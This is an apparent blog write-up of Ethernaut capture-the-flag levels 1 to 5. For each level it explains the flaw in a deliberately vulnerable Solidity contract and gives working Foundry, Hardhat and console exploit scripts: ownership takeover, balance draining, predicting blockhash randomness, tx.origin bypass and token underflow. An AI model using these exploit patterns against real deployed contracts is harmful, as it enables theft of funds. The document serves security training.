---
title: "Ethernaut Writeup - Part 1: Level 1-5"
published: 2026-09-10
category: "Blockchain"
tags: [Ethernaut, Solidity, Smart Contract Security, Blockchain]
draft: false
---

## Level 1 - Fallback

### Challenge Description
```
Look carefully at the contract's code below.

You will beat this level if
	1. you claim ownership of the contract
	2. you reduce its balance to 0
Things that might help

How to send ether when interacting with an ABI
How to send ether outside of the ABI
Converting to and from wei/ether units (see help() command)
Fallback methods
```

### Challenge Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
```

### Vulnerability Analysis
- To complete the challenge, we need to become the contract owner and reduce its balance to 0
- We can see that `contribute()` function allows us to become the contrct owner if `contributions[msg.sender] > contributions[owner]` 
- However, our contribution is increased by `contributions[msg.sender] += msg.value`, which each contribution must be less than `0.001 ether`. Moreover, owner's contribution is initialized is `1000 ether`, which is a big amount. Therefore, using thí function to become the owner would be too many trasactions, so this method is not pratical.
- Next, we look at the `receive()` function. This function checks that `msg.value > 0` and `contributions[msg.sender] > 0`. If both conditions are true, sender will become contract owner.
- So, we only need to call `contribute()` with small amount and send ETH directly to the contract. The `receive()` function will be triggered and change the owner to sender address.
- This is vulnerability is known as **`Broken Access Control`**
### Exploitation / PoC
#### Attack flow 
- Step 1: call `contribute()` with a small amount of ETJ to make sure `contributions[msg.sender] > 0`.
- Step 2: send ETH directly to contract to trigger the `receive()` function and become the new owner.
- Step 3: call `withdraw()` to drain the contract balance.

#### Exploit Code

##### DevTools 
```js
await contract.contribute({value: toWei("0.0005")})
await sendTransaction({from: player, to: contract.address, value: toWei("0.0005")})
await contract.withdraw()
```

##### Foundry
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../contract/Fallback.sol";

contract ExploitFallbackScript is Script {
    function run(address payable contractAddress) external {
        uint256 PrivateKey = vm.envUint("PRIVATE_KEY");
        Fallback target = Fallback(contractAddress);

        console.log("Contract Address:", contractAddress);
        console.log("Current Owner:", target.owner());
        console.log("Current Balance:", address(target).balance);

        vm.startBroadcast(PrivateKey);

        console.log("Step 1: call contribute() with a small amout");
        target.contribute{value: 0.0005 ether}();

        console.log("Step 2: send directly to contract");
        (bool success, ) = contractAddress.call{value: 0.005 ether}("");
        require(success, "Trigger receive failed");

        console.log("Step 3: withdraw all balance");
        target.withdraw();

        vm.stopBroadcast();

        console.log("New Owner:", target.owner());
        console.log("Balance after exploit:", contractAddress.balance);
    }
}
```

##### Hardhat
```js
import { network } from "hardhat";
import "dotenv/config";

const { ethers } = await network.create();

async function main() {
	const contractAddress = process.env.FALLBACK_INSTANCE;

	const [attacker] = await ethers.getSigners();
	console.log("Attacker address: ", attacker.address);

	const FallbackABI = [
		"function contribute() payable",
		"function getContribution() view returns (uint256)",
		"function withdraw()",
		"function owner() view returns (address)"
	];

	const target = new ethers.Contract(contractAddress, FallbackABI, attacker);

	console.log("Current Owner: ", await target.owner());
	let balance = await ethers.provider.getBalance(contractAddress);
	console.log("Current Balance: ", balance);

	console.log("Step 1: call contribute() function with a small amount")
	const tx1 = await target.contribute({ value: ethers.parseEther("0.0005") });
	await tx1.wait();
	console.log("Contribute success!");

	console.log("Step 2: send directly ETH to contract");
	const tx2 = await attacker.sendTransaction({
		to: contractAddress,
		value: ethers.parseEther("0.001")
	});
	await tx2.wait();
	console.log("Send ETH success!");

	console.log("Step 3: withdraw all balance");
	const tx3 = await target.withdraw();
	await tx3.wait();
	console.log("Exploit success and balance reduced to 0.")
	console.log("Current Owner: ", await target.owner());
	console.log("Current Balance: ", await ethers.provider.getBalance(contractAddress));
}

main().catch((error) => {
	console.error(error);
	process.exitCode = 1;
});
```

## Level 2 - Fallout

### Challenge Description
```
Claim ownership of the contract below to complete this level.
Things that might help
```

### Challenge Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Fallout {
    using SafeMath for uint256;

    mapping(address => uint256) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view return (uint256) {
        return allocations[allocator];
    }
}
```

### Vulnerability Analysis
- According to the challenge description, we need claim ownership of the contract to below complet this level.
- By reading through the contract, we can see that there is function that allows us to take ownership of the contract, which is the `Fal1out()` function. We just need to call this function to become the owner of the contract.
  
### Exploitation / PoC
#### Attack flow 
- We call function `Fal1out()` with a small amount of ETH

#### Exploit Code

##### DevTools 
```js
await contract.Fal1out({value: toWei("0.001")});
```

##### Foundry
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface IFallout {
    function Fal1out() external payable;
    function owner() external view returns (address);
}

contract ExploitFalloutScript is Script {
    function run(address payable contractAddress) public {
        IFallout target = IFallout(contractAddress);

        console.log("Owner Before Exploit: ", target.owner());
        vm.startBroadcast();

        target.Fal1out{value: 0.001 ether}();

        vm.stopBroadcast();

        console.log("Owner After Exploit: ", target.owner());
    }
}
```

##### Hardhat
```js
import { network } from "hardhat";
import "dotenv/config";

const { ethers } = await network.create();

async function main() {
	const contractAddress = process.env.INSTANCE;
	const [attacker] = await ethers.getSigners();
	console.log("Attacker Address: ", await attacker.getAddress());

	const ABI = [
		"function Fal1out() payable",
		"function owner() view returns (address)"
	];

	const target = new ethers.Contract(contractAddress, ABI, attacker);
	console.log("Owner before exploit: ", await target.owner());

	const tx = await target.Fal1out({ value: ethers.parseEther("0.001") });
	await tx.wait();

	console.log("Owner after exploit: ", await target.owner());
	if (await target.owner() == await attacker.getAddress()) {
		console.log("Exploit Success!");
	} else {
		console.log("Exploit Failed!");
	}
}

main().catch((error) => {
	console.error(error);
	process.exitCode = 1;
});
```

## Level 3 - CoinFlip

### Challenge Description
```
This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.
Things that might help
```

### Challenge Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```

### Vulnerability Analysis
- `blockhash(block.number - 1)` is on-chain data and can be calculated during contract execution.
- The division `blockValue / FACTOR` with `FACTOR = 2^255` can only return 0 or 1, because blockValue is at most `2^256 - 1`
- Therefore, `side` can only be `true` or `false`, and it can be predicted correctly if we calculate it and call `flip` within the same transaction.
- If we call `flip(_guess)` directly from an EOA, we have to choose `_guess` before the transaction is included in a block. At that time, we do not know which block will contain the transaction, so we cannot calculate the correct `side`. Each guess only has a 50% chance of being correct, making 10 consecutive wins extremely unlikely
- **Solution** : Use an intermediate exploit contract to calculate side during execution and call `flip(side)` **within the same transaction**. Since both contracts see the same `block.number`, they use the same previous block hash, allowing the exploit contract to predict the result correctly every time.


### Exploitation / PoC
#### Attack flow 
  1. **Setup:** Deploy an `Exploit` contract with the address of the target `CoinFlip` contract.
2. **Start the attack:** Call `Exploit.attack()` from the terminal or a script.
3. **Calculate and execute in the same transaction:**
   - Read `blockhash(block.number - 1)`.
   - Calculate `side` by dividing by `2^255`.
   - Call `target.flip(side)` to get one correct guess.
4. **Wait for a new block:** Sleep for about 15 seconds before sending the next transaction.
5. **Repeat:** Repeat the process 10 times.
6. **Finish:** Check that `consecutiveWins == 10`, then submit the instance.

#### Exploit Code

##### Foundry

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface ICoinFlip {
    function consecutiveWins() external view returns (uint256);
    function flip(bool _guess) external returns (bool);
}

contract Exploit {
    ICoinFlip public immutable target;
    uint256 constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _target) {
        target = ICoinFlip(_target);
    }

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = (coinFlip == 1);
        target.flip(side);
    }
}

contract AttackCoinFlip is Script {
    function run() external {
        address instance = vm.envAddress("INSTANCE_ADDRESS");
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(deployerPrivateKey);

        Exploit exploit = new Exploit(instance);
        console.log("Exploit deployed at:", address(exploit));

        exploit.attack();
        console.log("Current wins:", ICoinFlip(instance).consecutiveWins());

        vm.stopBroadcast();
    }
}
```
- After the first successful run, we need to run `exploit.attacke()` 9 more times, waiting for a new block between each transaction, until `consecutiveWins == 10`.
##### Hardhat
Similarly, we also need an intermediate `Exploit` contract to calculate the correct `side` and call `CoinFlip.flip()` within the same transaction.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
    function consecutiveWins() external view returns (uint256);
}

contract CoinFlipAttack {
    ICoinFlip public immutable target;
    uint256 public constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _target) {
        target = ICoinFlip(_target);
    }

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = (coinFlip == 1);

        target.flip(side);
    }
}
```
```js
import { network } from "hardhat";
import "dotenv/config";

const { ethers } = await network.create();

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

const instance = process.env.INSTANCE_ADDRESS;

const target = await ethers.getContractAt(
	["function consecutiveWins() view returns (uint256)"],
	instance
);

const Attacker = await ethers.getContractFactory("CoinFlipAttack");
const attacker = await Attacker.deploy(instance);
await attacker.waitForDeployment();
console.log(`Attacker deployed: ${await attacker.getAddress()}`);

while (true) {
	const wins = await target.consecutiveWins();
	if (wins >= 10) break;

	try {
		const tx = await attacker.attack();
		await tx.wait();
		await sleep(15000);
	} catch {
		await sleep(15000);
	}
}

console.log("Complete 10/10");
```

## Level 4 - Telephone

### Challenge Description
```
Claim ownership of the contract below to complete this level.
```

### Challenge Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```

### Vulnerability Analysis
- According to the challenge decription, we need claim ownership of the contract to complete this level
- By reading through the contract, we can see that `changeOwner(address _owner)` function, this function can change the ownership of the contract if `tx.origin != msg.sender`
	- `tx.origin` is the address of account that originally  started the transaction
	- `msg.sender` is the address that directly calls the current contract
- If you  call directly `changeOwner()` function from your account, then `tx.origin == msg.sender`. Therefore, the condition is false, and the ownership change is skipped.
- To bypass this condition, we need to use an intermediate contract to call `changeOwner()`


### Exploitation / PoC
#### Attack flow 
1. Create an intermediate contract that calls function `changeOwner()` of the challenge contract.
2. Use your account to call the function in the intermediate contract, which then calls function `changeOwner()` of the challenge contract
#### Exploit Code

##### Foundry
> TelephoneAttack.sol
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
    function owner() external view returns (address);
}

contract TelephoneAttack {
    ITelephone public target;

    constructor(address targetAddress) {
        target = ITelephone(targetAddress);
    }
    function attack(address newOwner) public {
        target.changeOwner(newOwner);
    }
}
```
> Telephone.s.sol
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "./TelephoneAttack.sol";

contract ExploitTelephoneScript is Script {
    function run(address contractAddress) public {
        uint256 PrivateKey = vm.envUint("PRIVATE_KEY");
        address attacker = vm.addr(PrivateKey);

        vm.startBroadcast(attacker);

        TelephoneAttack attackContract = new TelephoneAttack(contractAddress);
        attackContract.attack(attacker);

        vm.stopBroadcast();

        address newOwner = ITelephone(contractAddress).owner();
        require(newOwner == attacker, "Attack Failed!");
        console.log("Attack Success!");
    }
}
```
##### Hardhat
```js
import { network } from "hardhat";
import "dotenv/config";

const { ethers } = await network.create();

const instance = process.env.INSTANCE_ADDRESS;
const [player] = await ethers.getSigners();

const TelephoneAttack = await ethers.getContractFactory("TelephoneAttack");
const attackContract = await TelephoneAttack.deploy(instance);
await attackContract.waitForDeployment();

const attackAddress = await attackContract.getAddress();
console.log(`Attack contract deployed at: ${attackAddress}`);

const tx = await attackContract.attack(player);
await tx.wait();

const telephone = await ethers.getContractAt("ITelephone", instance);

const check = (await player.getAddress() === await telephone.owner()) ? "Attack Success!" : "Attack Failed!";
console.log(check);
```

## Level 5 - Token

### Challenge Description
```
The goal of this level is for you to hack the basic token contract below.
You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of token
```

### Challenge Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {
    mapping(address => uint256) balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
}
```

### Vulnerability Analysis
- The contract uses Solidity version `0.6.0`, which does not include built-in overflow and underflow checks. These checks were introduced in Solidity `0.8.0` and later version.
```solidity
function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }
```
- `uint256` is an **unsigned integer** with a value range from `0` to $2^{256} - 1$ (approximately $1.1579 \times 10^{77}$). Therefore, it cannot represent negative values.

- In Solidity versions earlier than `0.8.0`, arithmetic operations do not automatically check for integer overflow or underflow:

   * If `0 - 1` is calculated, the result does not become `-1`. Instead, it wraps around to the maximum `uint256` value: $2^{256} - 1$.
   * Similarly, $20 - 21 = -1$ wraps around to $2^{256} - 1$.

- The expression `balances[msg.sender] - _value` is evaluated before it is compared with `0`.
- If `_value = 21` while the current balance is only `20`, the subtraction underflows and results in a very large value: $2^{256} - 1$.

- Because this value is always greater than or equal to `0`, the condition `>= 0` always evaluates to `true`, making the `require` check ineffective.


### Exploitation / PoC

##### Foundry

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface IToken {
    function transfer(address _to, uint256 _value) external returns (bool);
    function balanceOf(address _owner) external view returns (uint256 balance);
}

contract ExploitTokenScript is Script {
    function run(address contractAddress) public {
        uint256 Privatekey = vm.envUint("PRIVATE_KEY");
        address attacker = vm.addr(Privatekey);

        vm.startBroadcast(attacker);

        IToken token = IToken(contractAddress);
        token.transfer(address(0xdeadbeef), 21);
        console.log("Balance of attacker:", token.balanceOf(attacker));

        vm.stopBroadcast();
    }
}
```
##### Hardhat
```js
import { network } from "hardhat";
import "dotenv/config";

const { ethers } = await network.create();

async function main() {
	const instance = process.env.INSTANCE_ADDRESS;
	const [attacker] = await ethers.getSigners();

	const TokenABI = [
		"function transfer(address _to, uint256 _value) public returns (bool)",
		"function balanceOf(address _owner) public view returns (uint256 balance)"
	];

	const token = new ethers.Contract(instance, TokenABI, attacker);
	const deadAddress = "0x000000000000000000000000000000000000dead";
	const tx = await token.transfer(deadAddress, 21);
	await tx.wait();

	const balanceAfterAttack = await token.balanceOf(await attacker.getAddress());
	console.log("Balance after attack: ", balanceAfterAttack.toString());

}

main().catch((error) => {
	console.error(error);
	process.exitCode = 1;
});
```
